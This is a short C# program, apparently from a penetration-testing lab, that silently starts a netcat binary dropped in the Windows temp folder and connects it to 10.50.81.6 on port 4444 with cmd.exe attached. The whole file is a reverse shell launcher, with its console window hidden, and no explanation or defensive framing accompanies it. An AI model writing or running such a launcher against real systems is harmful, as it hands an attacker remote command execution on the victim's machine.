using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
        	Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-alvin.exe", "10.50.81.6 4444 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
			proc.Start();
        }
    }
}